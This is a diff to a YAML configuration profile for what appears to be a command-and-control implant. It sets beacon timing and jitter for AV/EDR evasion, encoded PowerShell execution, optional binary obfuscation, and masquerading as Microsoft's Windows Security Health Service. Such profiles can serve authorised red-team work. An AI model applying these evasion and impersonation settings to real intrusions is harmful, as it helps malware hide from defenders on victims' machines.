@@ -1,6 +1,6 @@
-# OPSEC profile - real-world balance: moderate beacon, full evasion, 24/7 operation
-# Suitable for engagements where AV/EDR is present but you need reasonable responsiveness.
-# Shell timeout: use --timeout 180 (beacon max = 60s * 1.3 jitter = ~78s)
+# OPSEC profile — balanced real-world evasion, 24/7 operation
+# Recommended shell timeout: --timeout 180
+# Recommended build: include --no-gui for Windows targets
 name: opsec
 sleep_interval: 60s
 jitter_percent: 30
@@ -12,3 +12,14 @@ sleep_masking: true
 user_agent_rotation: true
 kill_date: ""
 working_hours_only: false
+
+# Level 1 evasion
+exec_method: powershell     # route all shell commands via PS -EncodedCommand
+obfuscate: false            # set true if garble is installed: go install mvdan.cc/garble@latest
+masquerade:
+  enabled: true
+  company: "Microsoft Corporation"
+  product: "Windows Security Health"
+  description: "Windows Security Health Service"
+  original_filename: "SecurityHealthService.exe"
+  version: "10.0.19041.1"
